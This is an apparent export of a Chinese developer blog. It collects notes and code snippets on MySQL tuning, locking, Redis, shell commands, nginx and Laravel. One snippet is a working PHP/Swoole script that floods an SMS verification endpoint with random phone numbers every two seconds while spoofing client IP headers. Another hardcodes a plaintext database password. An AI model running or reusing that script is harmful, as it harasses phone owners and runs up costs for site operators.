sleep(4);//睡眠4s再执行show global status like '%Slow_queries%';//查看慢查询条数得到返回记录集最多的10条SQL：mysqldumpslow -s r -t 10 /var/lib/mysql/695f5026f0f6-slow.log得到访问次数最多的10条SQL：mysqldumpslow -s r -t 10 /var/lib/mysql/695f5026f0f6-slow.log得到按照时间排序的前10条里面含有左连接的SQL：mysqldumpslow -s t -t 10 -g "left join" /var/lib/mysql/695f5026f0f6-slow.log也支持管道符命令mysqldumpslow -s t -t 10 -g "left join" /var/lib/mysql/695f5026f0f6-slow.log | more //分页显示cat /var/lib/mysql/695f5026f0f6-slow.log //查看慢查询日志-- 执行SQL时间# Time: 2019-12-31T05:54:23.893042Z-- 执行SQL的主机信息# User@Host: root[root] @ localhost [] Id: 40-- SQL的执行信息# Query_time: 4.013664 Lock_time: 0.000000 Rows_sent: 1 Rows_examined: 1-- SQL执行时间SET timestamp=1577771659;-- SQL内容select sleep(4);https://learnku.com/articles/39009 索引失效1234567891011121314151617explain select * from user where name = 'zhangsan' and age = 20 and pos = 'cxy' and phone = '18730658760';如果索引有多列，要遵守最左前缀法则即查询从索引的最左前列开始并且不跳过索引中的列explain select * from user where age = 20 and phone = '18730658760' and pos = 'cxy';mysql在使用不等于（!=、&lt;&gt;）的时候无法使用索引会导致全表扫描（除覆盖索引外）explain select * from user where age != 20;explain select * from user where age &lt;&gt; 20;少用orexplain select * from user where name = '2000' or age = 20 or pos ='cxy';正常（索引参与了排序）explain select * from user where name = 'zhangsan' and age = 20 order by age,pos;备注：索引有两个作用：排序和查找https://learnku.com/articles/38889导致额外的文件排序（会降低性能）explain select name,age from user where name = 'zhangsan' order by pos;//违反最左前缀法则explain select name,age from user where name = 'zhangsan' order by pos,age;//违反最左前缀法则explain select * from user where name = 'zhangsan' and age = 20 order by created_time,age;//含非索引字段 布尔值来作为 Group By Raw 条件1234567如何根据「 2001 年之前和 2001 年之后出生」 的条件进行分组？这是代码:$results = User::select(\DB::raw('YEAR(birth_date) &lt; 2001 as adult, COUNT(id) as amount')) -&gt;groupBy(\DB::raw('YEAR(birth_date) &lt; 2001')) -&gt;get();看起来很奇怪，对吧？让我解释一下。条件年份 (出生日期)&lt;2001 将返回两个值之一 真或假。换句话说，1 或 0。这正是我们需要分组的地方 —— 不管这个人是不是成年人。https://learnku.com/laravel/t/39537#reply126312 悲观锁与乐观锁123456789101112131415161718CREATE TABLE `order_stock` ( `id` int(11) NOT NULL AUTO_INCREMENT COMMENT 'ID', `oid` int(50) NOT NULL COMMENT '商品ID', `quantity` int(20) NOT NULL COMMENT '库存', PRIMARY KEY (`id`)) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8;“乐观锁🔒”认为拿锁的用户多半是会成功的，因此在进行完业务操作需要实际更新数据的最后一步再去拿一下锁就好。这样就可以避免使用数据库自身定义的行锁，可以避免死锁现象的产生。UPDATE order_stock SET quantity = quantity - 1 WHERE oid = 1 AND quantity - 1 &gt; 0; 乐观并发控制多数用于数据争用不大、冲突较少的环境中，这种环境中，偶尔回滚事务的成本会低于读取数据时锁定数据的成本，因此可以获得比其他并发控制方法更高的吞吐量。悲观锁采用了“一锁🔒二查🔍三更新”模式，就是采用数据库中自带 select ... for update 关键字进行对当前事务添加行级锁🔒，🧵先将要操作的数据进行锁上，之后执行对应查询数据并执行更新操作。BEGINSELECT quantity FROM order_stock WHERE oid = 1 FOR UPDATE;UPDATE order_stock SET quantity = 2 WHERE oid = 1; COMMIT;MySQL还有个问题是select ... for update语句执行中所有扫描过的行都会被锁上，这一点很容易造成问题。因此如果在MySQL中用悲观锁务必要确定走了索引，而不是全表扫描。https://www.debuginn.cn/4579.html MySQL 递归查询12345678910111213141516171819202122232425262728293031create table question_type ( id bigint primary key not null comment '问题编号', parentId bigint not null comment '问题父分类编号，根节点为 0', name varchar(20) not null comment '编号名称', path varchar(100) not null comment '全路径，每级使用 , 分割') comment '问题编号';insert into question_type values (1, 0, '数学', '0,1');insert into question_type values (2, 1, '高等数学', '0,1,2');insert into question_type values (3, 1, '线性代数', '0,1,3');insert into question_type values (4, 0, '英语', '0,4');insert into question_type values (5, 4, '即时翻译', '0,4,5');insert into question_type values (6, 4, '口语阅读', '0,4,6');insert into question_type values (7, 0, '物理', '0,7');insert into question_type values (8, 7, '高能物理', '0,7,8');insert into question_type values (9, 8, '无限能量', '0,7,8,9');insert into question_type values (10, 9, '迪克拉之海', '0,7,8,9,10');# 查询物理分类及其子级select *from question_typewhere path regexp concat( ',', 7, ',|^', 7, ',|,', 7, '$|^', 7, '$');https://blog.rxliuli.com/p/5830226b/ MySQL 行列转换1234567891011121314151617181920212223242526272829303132333435363738394041424344drop table if exists exam;create table exam ( name varchar(20) not null comment '姓名', subject varchar(20) not null comment '考试科目', score int null comment '考试成绩') comment '考试记录';insert into exam values ('琉璃', '语文', 90);insert into exam values ('琉璃', '英语', 85);insert into exam values ('楚轩', '数学', 100);insert into exam values ('楚轩', '物理', 100);insert into exam values ('张三', '化学', 40);insert into exam values ('李四', '生物', 100);select name as '姓名', max(if(subject = '语文', score, 0)) as '语文', max(if(subject = '数学', score, 0)) as '数学', max(if(subject = '英语', score, 0)) as '英语', max(if(subject = '物理', score, 0)) as '物理', max(if(subject = '化学', score, 0)) as '化学', max(if(subject = '生物', score, 0)) as '生物'from examgroup by name;select name as '姓名', sum(if(subject = '语文' or subject = '数学' or subject = '英语', score, 0)) as '主科', sum(if(subject = '物理' or subject = '化学' or subject = '生物', score, 0)) as '副科'from examgroup by name;select name as '姓名', max(case subject when '语文' then score else 0 end) as '语文', max(case subject when '数学' then score else 0 end) as '数学', max(case subject when '英语' then score else 0 end) as '英语', max(case subject when '物理' then score else 0 end) as '物理', max(case subject when '化学' then score else 0 end) as '化学', max(case subject when '生物' then score else 0 end) as '生物'from examgroup by name;https://blog.rxliuli.com/p/73dac442/ MySQL 获取随机条数据123456789101112131415161718192021222324252627282930313233343536373839create table topic ( id int primary key not null comment '编号', content varchar(20) not null comment '内容') comment '主题表';select *from topicorder by rand()limit 50000;select *from ( select topic.*, rand() as order_column from topic ) as temporder by order_columnlimit 50000;select *from topicwhere id &gt;= ((select max(id) from topic) - (select min(id) from topic)) * rand() + (select min(id) from topic)limit 50000;SELECT t.*FROM topic t JOIN (SELECT id FROM `topic` ORDER BY RAND() LIMIT 50000) AS z ON z.id = t.id;https://blog.rxliuli.com/p/931be19d/ Redis 知识点汇总 一张图搞定七种 JOIN 关系 MySQL EXPLAIN结果集分析 SQL注入总结 数据库水平切分二三事 mysql锁 InnoDB锁 MySQL 优化笔记 手把手带你探索 MySQL 事务的隔离 MySQl事务最全详解 MySQL的又一神器-锁，MySQL面试必备 MySQL 优化笔记 一条 SQL 查询语句是如何执行的 MySQL 表结构生成 Markdown 文档 mysql wiki MySQL 三大范式 在线sql 事务知识点总结 MySQL 学习笔记 悲观锁 &amp; 乐观锁 SQL注入总结https://anemone.top/sqli-SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/ MySQL事务最全详解 SQL注入的几种类型和原理 信息收集思路整理https://anemone.top/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%80%9D%E8%B7%AF%E6%95%B4%E7%90%86/ 搭建 MySQL 主从服务器 分库分表de那些事【理论篇】 一次慢查询优化过程 Navicat Premium 12 for Mac无补丁无毒的激活方法 一个 sql 转 mongo query 的小工具, https://github.com/guxingke/sql2mongo Mysql数据库设置主从同步 MySQL 事务最全详解 MySQL 索引 +explain MySQL 运行原理【事务】 MySQL 运行原理【表】 MySQL 社区规范 | 数据库篇 MySQL反应慢的排查思路 my.cnf生成工具 后端程序员必备：mysql数据库相关流程图/原理图 Mysql 使用 optimizer_trace 查看执行流程，分析、验证优化思路 一次 group by + order by 性能优化分析 sql_mode=only_full_group_by 错误 ClickHouse 快速入门 在线执行sql MySQL数据恢复工具binlog2sql CTF 中的 SQL 注入总结 MySQL 常用技巧 mysql 证明为什么用limit时，offset很大会影响性能 MySQL 细致总结之基础篇 mysql connection time out mysql replace into 坑 Redis学习 MyCAT实现MySQL读写分离 Redis 内存分析工具 mysql —— InnoDB行级锁机制 MySQL 社区规范 | 数据库篇 MySQL 规范 (数据库表设计规范) MySQL 规范 mysql数据库结构优化 阿里云Redis开发规范 MySQL索引优化实战 一个字节的网络漫游故事独白 技术精选 Redis过期策略及实现原理 19条MySQL优化 Mysql分表和分区的区别、分库分表介绍与区别 用Redis实现分布式锁 与 实现任务队列 面试官问你如何解决web高并发这样回答就好了 Redis实现分布式锁与任务队列的思路与源码 PHP+Redis，实现延迟任务 实现自动取消订单，自动完成订 MySQL 图形化工具 MYSQL的SQL性能优化总结 MySQL 主从复制 实例讲解 Redis从入门到实践 10分钟快速入门Redis MySQL工具汇总 MySQL 大表优化方案 Mysql 锁 pdo bindParam bindValue MYSQL 事务隔离实验-认识：脏读、不可重复读、幻读 MySQL分页优化 msyql日志 MySQL · 最佳实践 · 分区表基本类型 花式搭建 Laravel 运行环境 mysql中的数据存储选择 安装LNMP开发环境 Mysql Master&amp;Slave 实战 MySQL 主从复制部署与 Laravel 读写分离配置 教你 MySQL Binlog 实用攻略 《高性能MySQL》学习笔记1——MySQL架构 MySQL 部分整理 PHP开发之网站安全 mysql的水平分库分表和垂直分库分表 MySQL 索引初探 redis主从库读写分离 MySQL 中的四种隔离级别 MySQL 主从复制部署与 Laravel 读写分离配置 部署Laravel实战：Step 4 MySQL主从复制 Redis 面试内容 Pika是一个可持久化的大容量redis存储服务 yum 快速搭建 lnmp 开发环境 redis笔记 面试前必须要知道的 Redis 面试内容 elastic stack来分析下你的redis slowlog Redis 入门 在线sqlhttp://mywebsql.net/ MySQL 详细学习笔记 SQL 最近位置查询语句]]></content>
      <tags>
        <tag>mysql</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[代码段收集]]></title>
    <url>%2F2019%2F01%2F07%2F%E4%BB%A3%E7%A0%81%E6%AE%B5%E6%94%B6%E9%9B%86%2F</url>
    <content type="text"><![CDATA[shell12345678910111213141516171819echo -e "hell\bo"echo -e "h\te\tl\nl\to\t"echo -e "\x68\t\x65\t\x6c\n\x6c\t\x6f"//30m=黑色，31m=红色，32m=绿色，33m=黄色，34m=蓝色，35m=洋红，36m=青色，37m=白色[root@VM_0_14_centos fonts]# echo -e "\e[1;31m字符串\e[0m"字符串aliasalias 别名='原命令'vim ~/.bashrcsource ~/.bashrcunalias 别名vim /etc/profileHISTSIZE=1000/dev/null 这个文件是系统的黑洞，输出信息写入这里面就没啦一个判断命令是否正确执行的做法ls &amp;&amp; echo yes || echo nonetstat -an | grep ESTABLISHED | wc -l`` 反引号括起来的内容是系统命令，在Bash中会先执行它。和$()作用一样，不过推荐$()，因为反引号容易看错Bash中变量与PHP中的变量的区别是赋值不需要“$”，取值需要“$” redis批量删除key1234567891011121314151617181920212223242526272829从2.8.0以后redis提供scan来遍历key，而且这个过程是非阻塞，不会影响线上生产环境。最终经过修改的方案是用scan遍历要删除的key，然后调用del删除import sys,redisr = redis.Redis(host="127.0.0.1", port=6379,db=0)if len(sys.argv) &lt;= 1: print("必须指明匹配key字符串") exit(1)pattern = sys.argv[1]cursor = 0num = 1while 1 : resut = r.scan(cursor, pattern, 10000) del_keys = [] for i in resut[1]: key = i.decode() del_keys.append(key) #print("del keys len :%d" % len(result)) if len(del_keys) == 0: break r.delete(*del_keys) cursor = resut[0] print("delete keys num : %dw" % (num)) num +=1print("done\n")python3 main.py "king*" centos7安装redis3.212345678910111213141516171819202122232425262728293031323334353637383940414243wget http://download.redis.io/releases/redis-3.2.4.tar.gz tar -xvf redis-3.2.4.tar.gz cd redis-3.2.4 cat README.md make make install mkdir /etc/redis cp utils/redis.conf /etc/redis/ redis-server /etc/redis/redis.confvi /lib/systemd/system/redis.service[Unit]Description=redis service fileWants=network.target [Service]Type=forkingExecStart=/usr/local/bin/redis-server /etc/redis/redis.conf[Install]WantedBy=multi-user.targetvi /etc/redis/redis.confsystemctl daemon-reload #开机启动 systemctl enable redis.service #启动redis systemctl start redis.service #关闭redis systemctl stop redis.service firewall123456789101112131415161718192021222324252627282930# systemctl start firewalld # 启动,# systemctl enable firewalld # 开机启动# systemctl stop firewalld # 关闭# systemctl disable firewalld # 取消开机启动查看运行状态:[root:~]# firewall-cmd –staterunning查看当前的区域：[root:~]# firewall-cmd –get-default-zonepublic查看已被激活的区域信息:[root:~]# firewall-cmd –get-active-zonespublicinterfaces: eth0查询eth0网卡的区域：[root:~]# firewall-cmd –get-zone-of-interface=eth0public封禁 ip：[root:~]#firewall-cmd --permanent --add-rich-rule="rule family='ipv4' source address='222.222.222.222' reject"通过 ipset 来封禁 ip[root:~]#firewall-cmd --permanent --zone=public --new-ipset=blacklist --type=hash:ip [root:~]#firewall-cmd --permanent --zone=public --ipset=blacklist --add-entry=222.222.222.222 nginx反向代理解决跨域问题123456789101112有2个站点，front.aaa.com和api.aaa.com。假设这里我们2个站点都用nginx搭建，front.aaa.com的nginx配置文件为front.conf，api.aaa.com的nginx的配置文件为api.conf。当front站点的页面ajax访问api站点的时候就会起因这个跨域问题。我们在front站点配置1个针对api的反向代理，配置如下：server &#123; .... location /api/ &#123; rewrite ^/api/(.*) /$1 break; proxy_pass http://api.aaa.com; &#125; ....&#125;如此一来所有访问api的接口我们可以同构http://front.aaa.com/api/&#123;realApi&#125;来实现对后端接口的访问。 数据结构算法1234567891011121314151617181920212223242526272829303132333435363738394041//https://laravel-china.org/topics/21967$array = array( 'a' =&gt; array( 'a1' =&gt; array( 'a1_1' =&gt; array( 'a1_1_1' =&gt; array(), ), 'a1_2' =&gt; array(), ), 'a2' =&gt; array( 'a2_1' =&gt; array(), 'a2_2' =&gt; array(), 'a2_3' =&gt; array(), ) ), 'b' =&gt; array(),//...n+1);//print_r($array);function fuck($data = array(), &amp;$indirect_num = 0)&#123; foreach ($data as $key =&gt; $item) &#123; if (is_array($item) &amp;&amp; !empty($item)) &#123; $item = fuck($item, $indirect_num); $indirect_num += $item['_direct_num']; &#125; $data[$key] = $item; &#125; //直接下级 $data['_direct_num'] = $direct_num = count($data); //间接下级 $data['_indirect_num'] = $indirect_num; //所有下级 $data['_count_num'] = $direct_num + $indirect_num; //排序 ksort($data); return $data;&#125;print_r(fuck($array)); PHP 攻击短信验证码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455https://laravel-china.org/articles/22051function curl_post($url, array $params = array(),$ip, $timeout)&#123; $this_header = array( "charset=UTF-8", 'X-FORWARDED-FOR:'.$ip, 'CLIENT-IP:'.$ip ); $ch = curl_init();//初始化 curl_setopt($ch, CURLOPT_URL, $url);//抓取指定网页 curl_setopt($ch,CURLOPT_HTTPHEADER,$this_header); curl_setopt($ch, CURLOPT_HEADER, 0);//设置header curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);//要求结果为字符串且输出到屏幕上 curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout); curl_setopt($ch, CURLOPT_POST, 1);//post提交方式 curl_setopt($ch, CURLOPT_POSTFIELDS, $params); curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/43.0.2357.81 Chrome/43.0.2357.81 Safari/537.36"); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $data = curl_exec($ch);//运行curl curl_close($ch); return ($data);&#125;swoole_timer_tick(2000, function ($timer_id) &#123; $ip = get_rand_ip(); $phone = getPhone(); //这里添加短信验证码接口ur，并传入对应手机号参数(参数key看你要攻击的接口是啥，我这里是phone) $res = curl_post('替换成短信接口url',['phone'=&gt;$phone],$ip,30); if($res == '0')&#123; echo '验证码发送成功phone:'.$phone.'time:'.date('Y-m-d H:i:s').' 虚拟ip:'.$ip.PHP_EOL; &#125;else&#123; echo $res.PHP_EOL; &#125;&#125;);function getPhone()&#123; $arr = array( 130,131,132,133,134,135,136,137,138,139, 144,147, 150,151,152,153,155,156,157,158,159, 176,177,178, 180,181,182,183,184,185,186,187,188,189, ); return $arr[array_rand($arr)].mt_rand(1000,9999).mt_rand(1000,9999);&#125;function get_rand_ip()&#123; $arr_1 = array("218","218","66","66","218","218","60","60","202","204","66","66","66","59","61","60","222","221","66","59","60","60","66","218","218","62","63","64","66","66","122","211"); $randarr= mt_rand(0,count($arr_1)); $ip1id = $arr_1[$randarr]; $ip2id= round(rand(600000, 2550000) / 10000); $ip3id= round(rand(600000, 2550000) / 10000); $ip4id= round(rand(600000, 2550000) / 10000); return $ip1id . "." . $ip2id . "." . $ip3id . "." . $ip4id;&#125; get_object_vars12345array get_object_vars ( object $obj ) 返回由 obj指定的对象中定义的属性组成的关联数组。如果是关联数组：数组转对象可以直接用(object)()；对象转数组则要用get_object_vars()；如果是索引数组：数组转对象可以直接用(object)()；对象转数组直接用(array)()； 进制转换1234567891011121314151617181920212223242526272829303132333435363738394041# 十进制转二进制的方法：除2取余，逆序排列, https://blog.csdn.net/shirley_sweet/article/details/73896279def change(n): result = '0' if n == 0: # 输入为0的情况 return result else: result = change(n // 2) # 调用自身 return result + str(n % 2)def decimal_to_binary(decimal_val): ''' 十进制转为二进制 :param decimal_val: :return: ''' print('transfer %d to binary' % decimal_val) recursion_result = change(decimal_val) print('递归实现转换结果：', recursion_result)def binary_to_decimal_func(val): ''' 按照定义来实现，即 2^n 的形式 :param val: str :return: ''' print('original val: ', val) numbers = len(val) result = 0 for i in range(numbers): result += int(val[i]) * pow(2, numbers - i - 1) return resultdef binary_to_decimal(val): ''' 二进制转十进制 :param val: :return: ''' decimal2 = binary_to_decimal_func(str(val)) print('第二种转换二进制为十进制：', decimal2) 计算当前时间最近的 5 或 10 分钟12345678910111213141516//https://ourcodeworld.com/articles/read/756/how-to-round-up-down-to-nearest-10-or-5-minutes-of-datetime-in-phppublic function roundToNearestMinuteInterval(\DateTime $dateTime, $minuteInterval = 10)&#123; return $dateTime-&gt;setTime( $dateTime-&gt;format('H'), round($dateTime-&gt;format('i') / $minuteInterval) * $minuteInterval, 0 );&#125;$date = new DateTime("2018-06-27 20:37:00");$date = roundToNearestMinuteInterval($date);// Rounded from 37 minutes to 40// 2018-06-27 20:40:00echo $date-&gt;format("Y-m-d H:i:s"); 基于 swoole 协程的 MySQL 连接池123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104&lt;?php// +----------------------------------------------------------------------// | Created by PhpStorm// +----------------------------------------------------------------------// | Date: 19-1-4 上午9:42 https://laravel-china.org/articles/21979// +----------------------------------------------------------------------// | Author: woann &lt;304550409@qq.com&gt;// +----------------------------------------------------------------------class MysqlPool&#123; private $pool; //连接池容器 public static $instance = null; //实例 private $config = [ 'max_num' =&gt; 100, 'host' =&gt; '127.0.0.1', 'port' =&gt; 3306, 'user' =&gt; 'user', 'password' =&gt; 'password', 'database' =&gt; 'dbname', ]; //防止手欠在外部实例化，将构造函数私有化 private function __construct() &#123; &#125; /** * @author woann&lt;304550409@qq.com&gt; * @des 初始化 */ function init() &#123; $this-&gt;pool = new chan($this-&gt;config["max_num"]);//用channel来作为连接池容器 for ($i = 0; $i &lt; $this-&gt;config["max_num"]; $i++) &#123; $mysql = new Swoole\Coroutine\MySQL(); $res = $mysql-&gt;connect([ 'host' =&gt; '127.0.0.1', 'port' =&gt; 3306, 'user' =&gt; 'root', 'password' =&gt; 'wqg951122', 'database' =&gt; 'test', ]); if ($res == false) &#123; throw new RuntimeException("failed to connect mysql server"); &#125; $this-&gt;release($mysql); &#125; &#125; /** * @author woann&lt;304550409@qq.com&gt; * @return MysqlPool|null * @des 获取连接池实例 */ static public function getInstance() &#123; if (self::$instance == null) &#123; $mysqlpool = new MysqlPool(); $mysqlpool-&gt;init(); self::$instance = $mysqlpool; &#125; return self::$instance; &#125; /** * @author woann&lt;304550409@qq.com&gt; * @return mixed * @des 获取链接 */ function get() &#123; return $this-&gt;pool-&gt;pop(); &#125; /** * @author woann&lt;304550409@qq.com&gt; * @param $mysql * @des 回收链接 */ function release($mysql) &#123; $this-&gt;pool-&gt;push($mysql); &#125;&#125;require_once "MysqlPool.php";//引入连接池类$server = new Swoole\Http\Server("127.0.0.1", 9501);//创建httpserver$server-&gt;set([ 'worker_num' =&gt; 1,]);$server-&gt;on('Request', function($request, $response) &#123; $pool = MysqlPool::getInstance();//获取连接池实例 $conn = $pool-&gt;get();//获取链接 $stmt = $conn-&gt;prepare('SELECT * FROM usertb WHERE id = ?'); //预处理 if ($stmt == false) &#123; var_dump($conn-&gt;errno, $conn-&gt;error); &#125; $res = $stmt-&gt;execute(array(9988));//绑定参数 执行sql $pool-&gt;release($conn);//释放回收链接 $response-&gt;end(json_encode($res));//将查询结果转成json格式输出到浏览器&#125;);$server-&gt;start(); Linux 笔记分享四：Shell 基础 redis批量删除key 程序员的数学笔记1–进制转换 laravel 事件指定队列123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778https://laravel-china.org/articles/15338/laravel50-event-specifies-queue-nameshttps://www.jiangxianli.com/?p=68protected $listen = [ 'Shark\Events\Product\StockChangeEvent' =&gt; [ 'Shark\Listeners\Product\StockChangeListener', ], 'Shark\Events\Product\ProductAddEvent' =&gt; [ 'Shark\Listeners\Product\ProductListener', 'Shark\Listeners\Product\ProductAddListener', ],];Event::fire(new StockChangeEvent(1, 1));//event(new StockChangeEvent(1, 1));namespace app\Handlers;use Illuminate\Queue\InteractsWithQueue;use Illuminate\Contracts\Queue\ShouldBeQueued;use app\UpdateUserMessageEvent;class UpdateUserMessageHandler implements ShouldBeQueued&#123; use InteractsWithQueue; // 将事件监听推送到指定队列执行 public $queue = 'example'; // 延时执行时间 public $delay = 5; /** * Create the event handler. * * @return void */ public function __construct() &#123; &#125; /** * Handle the event. * * @param App\UpdateUserMessageEvent $event * @return void */ public function handle(UpdateUserMessageEvent $event) &#123; $event-&gt;update(); &#125; public function queue($queue, $job, $data) &#123; dump($job, $data,$this-&gt;queue,$this-&gt;delay);//Illuminate\Events\CallQueuedHandler@call dump($data); /* array:3 [ "class" =&gt; "app\Handlers\UpdateUserMessageHandler" "method" =&gt; "handle" "data" =&gt; "a:1:&#123;i:0;O:44:"app\UpdateUserMessageEvent":1:&#123;s:7:"@*@uids";a:2:&#123;i:0;s:4:"5656";i:1;s:4:"8888";&#125;&#125;&#125;"]*/ dump($this-&gt;queue,$this-&gt;delay);//example 5 if (isset($this-&gt;queue, $this-&gt;delay)) &#123; return $queue-&gt;laterOn($this-&gt;queue, $this-&gt;delay, $job, $data); &#125; if (isset($this-&gt;queue)) &#123; return $queue-&gt;pushOn($this-&gt;queue, $job, $data); &#125; if (isset($this-&gt;delay)) &#123; return $queue-&gt;later($this-&gt;delay, $job, $data); &#125; return $queue-&gt;push($job, $data); &#125;&#125; 记录guzzle12345678910111213141516171819202122232425262728293031323334353637383940414243444546&lt;?phpnamespace App\Services;use Illuminate\Http\Request;use GuzzleHttp\Event\EmitterInterface;use GuzzleHttp\Event\BeforeEvent;use GuzzleHttp\Event\CompleteEvent;use GuzzleHttp\Event\EndEvent;use GuzzleHttp\Event\Emitter;class GuzzleEmitter extends Emitter&#123; public function __construct($rs_info = 'api_time') &#123; $start = 0; $this-&gt;on('before', function (BeforeEvent $event, $name) use(&amp;$start, $rs_info)&#123; $start = microtime(true); &#125;); $this-&gt;on('end', function (EndEvent $event) use(&amp;$start, $rs_info)&#123; if ($event-&gt;getException()) &#123; $this-&gt;sysLog(['rs' =&gt; $event-&gt;gettransferInfo()['url'], 'cmd' =&gt; $event-&gt;getRequest()-&gt;getmethod(), 'code' =&gt; $event-&gt;gettransferInfo()['http_code'], 'rs_info' =&gt; $rs_info, 'rs_type' =&gt; 1, 't_total' =&gt; intval((microtime(true)-$start)*1000), 'p_ip' =&gt; $event-&gt;gettransferInfo()['primary_ip'], 'msg' =&gt; $event-&gt;getException()-&gt;getMessage()]); &#125; else &#123; $method=$event-&gt;getRequest()-&gt;getmethod(); $post_data=($method=='POST')?((string)$event-&gt;getRequest()-&gt;getBody()):''; $this-&gt;sysLog([ 'rs' =&gt; $event-&gt;gettransferInfo()['url'], 'cmd' =&gt; $method, 'code' =&gt; $event-&gt;gettransferInfo()['http_code'], 'rs_info' =&gt; $rs_info, 'rs_type' =&gt; 1, 't_total' =&gt; intval((microtime(true)-$start)*1000), 'p_ip' =&gt; $event-&gt;gettransferInfo()['primary_ip'], 'rs_content'=&gt;$post_data, ]); &#125; &#125;); &#125; private function sysLog($data) &#123; openlog('guzzle',LOG_PID|LOG_ODELAY,LOG_LOCAL7); syslog(LOG_INFO,json_encode($data)); closelog(); &#125;&#125; 记录Redis12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788&lt;?php//基于predisnamespace App\Services;use \Predis\Command\CommandInterface;use \Predis\Connection\StreamConnection;class RedisLog extends StreamConnection&#123; private $tstart = 0; private $debugBuffer = array(); public function connect() &#123; $this-&gt;tstart = microtime(true); parent::connect(); &#125; private function storeDebug(CommandInterface $command, $direction) &#123; $firtsArg = $command-&gt;getArguments(); $timestamp = (microtime(true) - $this-&gt;tstart) * 1000; $log = []; $log['cmd'] = $command-&gt;getId(); $log['key'] = isset($firtsArg) ? $firtsArg : ' '; $log['server'] = "$direction $this"; $log['time'] = $timestamp; $this-&gt;sysLog(['rs' =&gt; trim($log['server']), 'cmd' =&gt; $command-&gt;getId(), 'rs_info' =&gt; $log['key'], 'rs_type' =&gt; 2, 't_total' =&gt; $timestamp, 'msg' =&gt; ['host' =&gt; explode(':', trim($log['server']))[0], 'port' =&gt; explode(':', trim($log['server']))[1]]]);// dump($log);// $this-&gt;debugBuffer[] = &amp;$log; unset($log); &#125; public function writeRequest(CommandInterface $command) &#123; parent::writeRequest($command);// $this-&gt;storeDebug($command, '-&gt;'); &#125; public function readResponse(CommandInterface $command) &#123; $response = parent::readResponse($command); $this-&gt;storeDebug($command, ''); return $response; &#125; public function getDebugBuffer() &#123; return $this-&gt;debugBuffer; &#125; public static function debug() &#123; $options = array( 'connections' =&gt;[ 'tcp' =&gt; '\App\Services\RedisLog', ], ); $client = new \Predis\Client(config('database.redis.log'), $options); $client-&gt;get('redis:debug:test'); var_export($client-&gt;getConnection()); /* OUTPUT: array ( 0 =&gt; 'SELECT 15 -&gt; 127.0.0.1:6379 [0.0008s]', 1 =&gt; 'SELECT 15 &lt;- 127.0.0.1:6379 [0.001s]', 2 =&gt; 'SET foo -&gt; 127.0.0.1:6379 [0.001s]', 3 =&gt; 'SET foo &lt;- 127.0.0.1:6379 [0.0011s]', 4 =&gt; 'GET foo -&gt; 127.0.0.1:6379 [0.0013s]', 5 =&gt; 'GET foo &lt;- 127.0.0.1:6379 [0.0015s]', 6 =&gt; 'INFO -&gt; 127.0.0.1:6379 [0.0019s]', 7 =&gt; 'INFO &lt;- 127.0.0.1:6379 [0.0022s]', ) */ &#125;&#125;cat config/database.php'options' =&gt; [ 'replication' =&gt; true, 'connections' =&gt;[ 'tcp' =&gt; '\App\Services\RedisLog', ], ], 监控redis对应队列消息123456789101112131415161718192021https://laravel-china.org/articles/4479/analysis-of-laravel-queue-usagetail -f | redis-cli -h 10.94.120.13 -p 6380 monitor | grep "queues:snail"1492446053.406282 [0 10.95.117.155:57132] "WATCH" "queues:snail:SendMessage:delayed"1492446053.406452 [0 10.95.117.155:57132] "ZRANGEBYSCORE" "queues:snail:SendMessage:delayed" "-inf" "1492446053"1492446053.406754 [0 10.95.117.155:57132] "WATCH" "queues:snail:SendMessage:reserved"1492446053.406842 [0 10.95.117.155:57132] "ZRANGEBYSCORE" "queues:snail:SendMessage:reserved" "-inf" "1492446053"1492446053.407029 [0 10.95.117.155:57132] "LPOP" "queues:snail:SendMessage"1492446053.407700 [0 10.95.117.155:57132] "ZADD" "queues:snail:SendMessage:reserved" "1492446113" "&#123;job&#125;"1492446053.463953 [0 10.95.117.155:57132] "ZREM" "queues:snail:SendMessage:reserved" "&#123;job&#125;"laravel这边的延迟队列使用了三个队列。queue:default:delayed // 存储延迟任务queue:default // 存储“生”任务，就是未处理任务queue:default:reserved // 存储待处理任务任务在三个队列中进行轮转，最后一定进入到queue:default:reserved，并且成功后把任务从这个队列中删除。laravel5.1 使用了watch来控制队列的原子操作，但由于codis本身不支持 watch 方法。所以使用codis不能完全体验队列功能：延迟队列不支持、不支持数据重跑，对线上数据比较严格操作谨慎使用。laravel5.3 之后redis队列 开始使用lua脚本支持的队列原子操作，它没有使用 watch multi等操作，所以如果线上codis 支持lua的话，可以完整体验到队列功能。 使用写库读数据12345678910111213141516171819202122$user = DB::selectFromWriteConnection('select * from users where id=42111');User::onWriteConnection()-&gt;find($id);cat config/database.php 'sticky' =&gt; true, // laravel 5.5 新增$sql = 'select * from a';DB::select($sql, [], false);#在 config/database.php 配置文件里面配置读库'write' =&gt; [ 'driver' =&gt; 'mysql', 'host' =&gt; env('DB_WRITE_HOST', 'localhost'), 'database' =&gt; env('DB_DATABASE', 'forge'), 'username' =&gt; env('DB_USERNAME', 'forge'), 'password' =&gt; env('DB_PASSWORD', ''), 'charset' =&gt; 'utf8', 'collation' =&gt; 'utf8_unicode_ci', 'prefix' =&gt; '', 'strict' =&gt; false, ],#手动链接主库查询DB::connection('write')-&gt;table('a')-&gt;get();$pdo = DB::connection()-&gt;getPdo();$data=DB::connection()-&gt;setPdo($pdo)-&gt;table('a')-&gt;get(); Excel 